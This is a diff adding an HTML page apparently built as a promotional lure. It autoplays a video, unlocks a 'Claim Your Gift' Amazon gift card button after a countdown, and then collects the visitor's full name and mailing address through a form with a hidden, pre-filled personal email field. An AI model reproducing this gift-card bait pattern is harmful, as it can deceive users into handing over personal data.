@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8" />
+	<title>Auto Play</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<script src="js/iphone-inline-video.js"></script>
+	<script src="js/jquery-2.0.3.js"></script>
+	<link rel="stylesheet" href="css/style.css">
+	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+	 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+	<script src="js/jquery.countdownTimer.js"></script>
+</head>
+<body onload='setTimeout(myFunction, 10000)'>
+
+	<div class="video-container" style='background-color:black;'>
+		<video autoplay muted loop playsinline src="video/add.mp4" id='myVideo'></video>
+		<img src='images/white-play-pause.png' class='play btn' title='Play/pause' width='40px'>
+		<img src='images/white-fullscreen.png' class='fullscreen btn' width='40px' title='fullscreen'>
+	        <a id="mute"><img  id='mute1' src='images/white-mute.png' class="mute btn" width='40px' title='Sound(ON/OFF)'></a>
+		<input type="hidden" id="audioFile" size="0"  />
+		<div><hr/>
+<div class="container">	
+<div class='col-md-5'>
+	<button class='btn btn-default' disabled id='claim' data-toggle="modal" data-target="#myModal">
+	<img class='img-responsive img-thumbnail' src='amazon-gift-card.png' width='100%' /></button>
+	<p style='color:#ffffff'><strong >Claim You Gift after </strong><span id="s_timer"></span></p>
+</div>	
+           <!-- Modal -->
+<div id="myModal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+
+    <!-- Modal content-->
+    <div class="modal-content modal-md">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal">&times;</button>
+        <h4 class="modal-title">Please fill the form to get the link of your gift card</h4>
+      </div>
+      <div class="modal-body">
+       <form class="form-horizontal" role="form" action='verify' method='GET'>
+        <div class="form-group">
+                    
+                    <div class="col-sm-10">
+                        <input type="text" name='name' class="form-control" id="name" placeholder="Full Name"/>
+                    </div>
+                  </div>
+                  <div class="form-group">
+                  
+                    <div class="col-sm-10">
+                    <textarea name='address' class="form-control" id="inputEmail3" required placeholder='Your Mailing Address...'></textarea>
+                    <input type="hidden" placeholder="Email" name='email' value="rahuraj225@gmail.com">
+                    </div>
+                  </div>
+       
+                  <div class="form-group">
+                    <div class="col-sm-offset-2 col-sm-10">
+                      <button type="submit" class="btn btn-success">Claim Your Gift</button>
+                    </div>
+                  </div>
+                </form>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+      </div>
+    </div>
+
+  </div>
+</div>                 
+
+	<script src="js/index.js"></script>
+
+	
+	<script>
+var vid = document.getElementById("myVideo");
+
+function enableMute() { 
+    vid.muted = true;
+	}
+	
+	var audioElm = document.getElementById("myVideo");
+	var button = document.getElementById("mute");
+	button.addEventListener("click", function () {
+      if (audioElm.muted == true) {
+        audioElm.muted = false;
+      } else {
+        audioElm.muted = true;
+      }
+    }, false);
+
+    audioElm.addEventListener("volumechange", function () {
+      if (audioElm.muted) {
+        // if muted, show mute image
+        button.innerHTML = button.innerText = "<img  id='mute1' src='images/white-mute.png' class='mute btn' width='40px' title='Sound(ON/OFF)'>"; // button text 
+      } else {
+        // if not muted, show not muted image
+        button.innerHTML = button.innerText = "<img  id='mute1' src='images/white-sound.png' class='mute btn' width='40px' title='Sound(ON/OFF)'>"; // 
+      }
+    }, false);
+    
+	
+	function myFunction() {
+	   $('#claim').removeAttr('disabled');
+	}
+	//timer function
+	 $(function(){
+                    $('#s_timer').countdowntimer({
+                        seconds :10,
+                        size : "lg"
+                    });
+                });
+                            </script>
+                            </div>
+
+</body>
+</html>
